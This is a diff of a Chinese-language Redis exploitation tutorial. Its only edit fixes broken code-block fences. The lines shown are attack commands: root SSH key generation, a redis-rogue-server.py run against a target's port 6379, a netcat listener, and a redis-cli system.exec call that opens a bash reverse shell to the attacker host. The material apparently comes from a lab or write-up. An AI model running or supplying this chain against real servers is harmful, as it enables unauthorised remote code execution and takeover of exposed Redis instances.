@@ -77,7 +77,7 @@ bgsave    # 触发持久化（写入磁盘）
 ssh-keygen -t rsa -b 4096 -N "" -f /root/.ssh/id_rsa
 
 cat /root/.ssh/id_rsa.pub
-···
+```
 
 
 
@@ -106,14 +106,14 @@ python3 redis-rogue-server.py --rhost 10.165.15.225 --rport 6379 --lhost 10.165.
 
 1、攻击机第一个终端监听
 
-···
+```
 nc -lvnp 4444
-···
+```
 
 
 2、攻击机第二个终端输入
 
-···
+```
 redis-cli -h 10.165.15.225 -p 6379
 system.exec "bash -c 'bash -i >& /dev/tcp/10.165.15.22/4444 0>&1'"
 ```
